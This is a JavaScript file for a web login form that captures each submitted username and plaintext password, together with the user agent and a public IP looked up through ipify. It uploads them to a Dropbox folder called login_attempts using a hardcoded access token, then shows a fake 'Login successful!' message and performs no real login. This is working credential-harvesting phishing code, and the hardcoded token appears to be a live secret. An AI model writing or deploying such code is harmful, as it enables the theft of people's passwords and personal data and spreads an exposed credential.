// Wait until the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const errorMessageElement = document.getElementById('error-message');

    loginForm.addEventListener('submit', async function (event) {
        event.preventDefault(); // Prevent default form submission

        // Capture and trim input values
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();

        // Validate that both fields are filled out
        if (!username || !password) {
            errorMessageElement.textContent = "Please enter both username and password!";
            return;
        }

        // Build the login data object
        const loginData = {
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ipAddress: await fetchIPAddress()
        };

        // Send login data to Dropbox
        const response = await sendToDropbox(JSON.stringify(loginData, null, 2));
        if (response.success) {
            alert("Login successful!");
            errorMessageElement.textContent = "";
        } else {
            errorMessageElement.textContent = "Error sending data to Dropbox. Check console.";
        }
    });

    // Function to send login data to Dropbox using the Dropbox API
    async function sendToDropbox(data) {
        const DROPBOX_ACCESS_TOKEN = "sl.u.AFl74Y1UXkCTdsRVMGGBcspi4Bm0aNWYgcTySgDdzljbBnYmZ-XgT_IPbQRS7l0pQEzm5eFsW_yvuHwHTEK7fJ41_QqcROaA7kGEIFNbWynNcBjNGpaMQL0fbhBc9HsDAAN7h1qoFq9BVn5_QuuW0vGwuJhWXxghPsXZa4-1EP9V6--qw6QWFaQNGCtJGZPenSKAJc0ns6WQzj3LsBe6OKU03fTmudDZ6KDgONhDZNkMp2k__kZ1knNk0zFMW3W6MD_5DOLufl5FfzJloyL8JPhZOb6hcP_Zn3aXDw4lDfKO_z_Wp-WHB5VEK6d_9RNzwfuoXA4iZBgbEXda1OpF1LyE5ytlWMpqCQETCXqn3zCSu_bPHM86LLnKE3DofTq_HXoCxOJ0XVfRXtUDgxiBr_ULIRtDCfWW4_j0OjrUtnCdQzlarnNHRqdFcOIzD3yYlCbsOKlYIcbNojkDXVYESVfrjSQPJa5FB_aApiZwQhlfLvKQ_zro_U9mH28MI5GWUqTzLBdvpfP3S-bqp-XWTL39K-53RGfYM7WKHqN6d3RputTyrFGwdx56NV0G9MXqumMyPf1wILHrwwGp6ZMSnIsTISYd61rASNYYVVr7_yWrhfsJJ_IylPAmCQv_ACumIEQySvJ63kFZo9zTEX5Eu8dr54re71UObUzrEvhWCv3XNhN8sdMYCKF83m_OacE1zFmUVwXGhXHU4g9gY3w4gBflAjDgPCNnMHEt-T7PYJqLdDkGVtObZlXjLDKNObBdGJABCc4fsH9ljQa8Qt27g5aYtiRiVr-bN0Q0EmLo31KFhSe9KViZnHTKN-7jPtvMvXFrp6-j9d4NGpiBhYuZtoZt6KF6sEQPWKgqtdw4fobWIMbxzJxDlcFj84oTeuPkz8yk3clKbs9YMOqyApS5l35CPD8a3CFvHGCme-6Gew0v-OJifSJCfyutNnPQjIyrlUlsaNO_8yAX-DtWVs__UAs5yT54cO38PYL27145HvTijTNV3l14_JCBuYeKLlnG-Jl3_KZKNYjWEm6y2y60LzQj82AsCa0I3PdF-wG3sMl8bFaubOok4LKuRpQJkTTooUQpnlj7sWHkyxyJVydFgXSLg_CMOIexX1tmQHJnmVU4BMtJyg5V4pao1Bz8UK7bIrSZrycOJo8EY6rAKeXsO7HYDHB-VULCFZUjZkDiLSzC096GNAvkZlJXjHPwZId2lrvsSHrvbksZorJrJ-qWcUcCceYzbKr0lhrsQzeQ0MlZQdaB7d5xa6sKxeYpIgPlUfdKjH466rU_JRNMill7aK8wMLjvHAwp_jVo3coNSVB4gmom54-aS5cb2k5oscZQWXTeHom5f6fzOkvvrQ1uyYEWJDVOj9lQC3bDRoot68xspCI6BpStm3sTzgD8G1Yy4PlwnTDvwXbV3ruiIOm8hmYvQ8-Uc7Lci1z-HfA964V0cQ"; // Replace with your token
        const fileName = `login_attempt_${Date.now()}.json`;
        try {
            const response = await fetch("https://content.dropboxapi.com/2/files/upload", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${DROPBOX_ACCESS_TOKEN}`,
                    "Dropbox-API-Arg": JSON.stringify({
                        "path": `/login_attempts/${fileName}`,
                        "mode": "add",
                        "autorename": true,
                        "mute": false
                    }),
                    "Content-Type": "application/octet-stream"
                },
                body: data
            });
            const result = await response.json();
            console.log("Dropbox Response:", result);
            if (result.error) {
                throw new Error(result.error_summary);
            }
            return { success: true, result };
        } catch (error) {
            console.error("Error sending data to Dropbox:", error);
            return { success: false, error };
        }
    }

    // Function to fetch the user's public IP address using the ipify API
    async function fetchIPAddress() {
        try {
            const response = await fetch("https://api64.ipify.org?format=json");
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error("Error fetching IP address:", error);
            return "Unknown";
        }
    }
});
